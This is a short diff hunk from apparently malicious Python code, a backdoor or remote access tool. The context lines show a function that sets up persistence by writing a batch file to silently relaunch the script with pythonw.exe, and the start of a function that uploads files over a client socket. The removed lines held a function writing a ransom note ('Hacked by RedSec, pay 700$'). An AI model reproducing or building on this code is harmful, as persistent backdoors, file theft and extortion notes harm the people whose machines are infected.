@@ -107,10 +107,6 @@ def make_persistent():
         batch_file.write(f"@echo off\npythonw.exe -u {os.path.abspath(sys.argv[0])}\nexit\n")
     print(f"File created.")
 
-def redsec():
-    with open("RedSec.txt", 'w') as f:
-        f.write("Hacked by RedSec, pay 700$.")
-
 def upload_file(client_socket, filename):
     try:
         with open(filename, 'rb') as file:
